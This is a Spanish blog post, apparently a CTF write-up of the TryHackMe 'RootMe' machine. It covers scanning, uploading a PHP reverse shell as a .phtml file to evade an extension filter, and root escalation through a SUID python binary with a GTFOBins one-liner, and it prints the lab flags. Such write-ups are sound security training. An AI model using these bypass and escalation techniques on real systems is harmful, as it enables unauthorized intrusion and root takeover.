---
layout: post
title: Tryhackme - Rootme
autor: S3cureroy
date: 2023-02-10
categories: [CTF, Tryhackme]
tags: [suid, reverse shell, nmap, python, dirsearch, misconfiguration]
---

Hoy traigo un *writeup* de una máquina muy sencilla, que permite seguir practicando la explotación web mediante el uso de la explotación de una mala configuración en un *CMS*, para posteriormente, usar técnicas de escalada de privilegios en entornos Linux, concretamente, la explotación de un binario con permisos SUID.

La máquina está categorizada como fácil, pero en el momento de encararla, no imaginaba que iba a ser tan sencilla.

Destacaría de esta máquina el filtrado de extensiones en la subida de la shell, el cual, como se verá más adelante, no permite subir ciertos ficheros, pero se evade de manera sencilla.

## Enumeración.

Se empieza mediante el uso de la herramienta ```nmap``` usando los parámetros para que muestre las versiones de los programas instalados, y además, se lancen los scripts más usados en entornos Web.

~~~bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 04:21 EDT
Nmap scan report for 10.10.6.35
Host is up (0.061s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
~~~

### Servidor Web.

Al descubrir que se está exponiendo el puerto 80, y que además se trata del conocido servidor Web Apache, se decide enumerar recursos de la página mediante el uso de la herramienta ```dirsearch```.

~~~
04:27:05] Starting: 
[04:27:08] 403 -  275B  - /.htaccess-dev                              
[04:27:08] 403 -  275B  - /.htaccess-local
[04:27:08] 403 -  275B  - /.htaccess-marco
[04:27:08] 403 -  275B  - /.htaccess.old
[04:27:08] 403 -  275B  - /.htaccess.bak1
[04:27:08] 403 -  275B  - /.htaccess.sample
[04:27:08] 403 -  275B  - /.htaccess.save
[04:27:08] 403 -  275B  - /.htaccess.orig
[04:27:08] 403 -  275B  - /.htaccess.txt
[04:27:08] 403 -  275B  - /.htaccessOLD
[04:27:08] 403 -  275B  - /.htaccessBAK
[04:27:08] 403 -  275B  - /.htaccessOLD2
[04:27:08] 403 -  275B  - /.htpasswd-old
[04:27:08] 403 -  275B  - /.httr-oauth
[04:27:09] 403 -  275B  - /.php                                       
[04:27:11] 200 -  616B  - /
[04:27:24] 301 -  306B  - /css  ->  http://10.10.6.35/css/
[04:27:28] 200 -  616B  - /index.php
[04:27:28] 200 -  616B  - /index.php/login/
[04:27:29] 301 -  305B  - /js  ->  http://10.10.6.35/js/
[04:27:32] 301 -  308B  - /panel  ->  http://10.10.6.35/panel/
[04:27:32] 200 -  732B  - /panel/                         
[04:27:35] 403 -  275B  - /server-status
[04:27:35] 403 -  275B  - /server-status/
[04:27:39] 200 -  741B  - /uploads/
[04:27:39] 301 -  310B  - /uploads  ->  http://10.10.6.35/uploads/
                                                                                        
Task Completed
~~~

Se obtiene el código de respuesta 200 en el recurso ```/login```, al cual se accede. 

Dentro, solamente hay un título, sin posibilidad de hacer nada más, al menos aparentemente.

## Acceso inicial.

Dentro de ```/panel``` se pueden subir ficheros que se descubre, pueden ser vistos en el recurso ```/uploads```.

Se sube un fichero que contiene una shell reversa en lenguaje **php** con el nombre ```hola.phtml```. Esto es debido a que la web incorpora un sistema de protección basado en el filtrado de extensiones, y no se puede subir con la extensión del propio lenguaje.

Se abre un puerto con ```nc``` en la máquina atacante, y al abrir el fichero desde el navegador, se obtiene acceso a la máquina.  
![Acceso inicial][rootme1]

Una vez dentro, se obtiene la flag de usuario, alojada en ```/var/www/user.txt```.

~~~bash
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
~~~

## Escalada de privilegios.

Generalmente, se debe enumerar vectores de escalada de privilegios manualmente, sobre todo para aprender como explotar dichos vectores y para generar una metodología, pero en este caso, se transfiere mediante el módulo **SimpleHTTPServer** el script llamado LinEnum que automatiza esta tarea.

El script informa que el binario de python dispone del bit SUID que pueden ser explotados. Por tanto, se busca en la Web [GTFObins](https://gtfobins.github.io/gtfobins/python/) como.  
![Salida Lineum][rootme2]
![GTFObins][rootme3]

Se lanza el comando que indica la web GTFObins en la máquina víctima, después de poner a escuchar un puerto en la máquina atacante.

```python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
``` 

Entonces se obtiene una shell, que si se lanza un comando ```id``` se puede ver que el euid (*effective uid*) es root.

~~~bash
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
~~~

Se accede a la flag de root terminando la explotación de la máquina.

~~~bash
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
~~~

<a href="#top">Volver arriba</a>

[rootme1]: https://i.imgur.com/FBlxsxX.png
[rootme2]: https://i.imgur.com/F9EmKQw.png
[rootme3]: https://i.imgur.com/uQVCB1u.png


